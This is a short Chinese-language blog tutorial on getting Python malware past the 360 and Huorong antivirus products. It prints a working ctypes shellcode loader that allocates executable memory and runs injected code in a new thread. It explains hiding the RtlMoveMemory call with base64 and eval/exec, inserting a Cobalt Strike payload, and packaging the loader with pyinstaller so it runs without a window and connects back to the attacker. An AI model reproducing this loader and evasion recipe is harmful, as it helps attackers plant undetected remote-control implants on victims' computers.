# python bypass杀软第一季

## python bypass360、火绒=-=

今天看b站看了yuppt大佬的免杀思路，决定记录下来，学习一下。

环境：python3.8.0_x86、CS4.0、火绒、360全家桶、pyintaller、帅哥一个。

* * *

1、 python的shellcode加载器：网上随便找都有。

    
    
    # coding: utf-8
    import ctypes
    shellcode = b''
    shellcode = bytearray(shellcode)
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
    h = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1))
    

2、这个加载器肯定是不免杀的，想免杀就要做点手脚，=-=比如买杀软的手脚。由于杀软不可能把shellcode直接杀掉，所以我们就来看一下杀软把哪一个函数给查杀了，手动fuzz发现，查杀的是:`ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
buf, ctypes.c_int(len(shellcode)))`。

![image](https://image.3001.net/images/20210124/1611459709_600cec7d42800b1ac3851.png!small)

3、想办法对`ctypes.windll.kernel32.RtlMoveMemory`这个函数进行处理。=-=各位表哥们的方法肯定很多，我这里就用最简单的方法进行处理，base64加密。

![image](https://image.3001.net/images/20210124/1611459889_600ced31305c05cb3cfda.png!small)

4、加密之后要怎么让这个代码执行呢，所以就要用到python的执行函数。eval大哥，其实还有很多可以代替eval函数，比如各位大佬应该可以想到exec吧。

![image](https://image.3001.net/images/20210124/1611459923_600ced53409ed7e15d6e1.png!small)

5、用杀软先扫描一下，我先去买杀软的手脚，买好了，现在不杀了，成功bypass。

![image](https://image.3001.net/images/20210124/1611460132_600cee2432dd3c36affc1.png!small)

6、接来下就是拿出CS，生成一个c语言的shellcode。

![image](https://image.3001.net/images/20210124/1611460150_600cee3658728e2b1692d.png!small)

7、然后把shellcode丢进加载器中。

![image](https://image.3001.net/images/20210124/1611460168_600cee48bdcc0cccad538.png!small)

8、使用pyintaller生成exe文件，启动杀软，=-=，点击运行，等待CS上线，完美过火绒、360动态和静态。ps:要想不要黑框，在打包的时候加-w参数就行了。

![image](https://image.3001.net/images/20210124/1611460185_600cee593fe577a6d3809.png!small)

![image](https://image.3001.net/images/20210124/1611460208_600cee708ccdc8aef08f9.png!small)

9、最后希望各位表哥们可以多多带上弟弟一起学习。

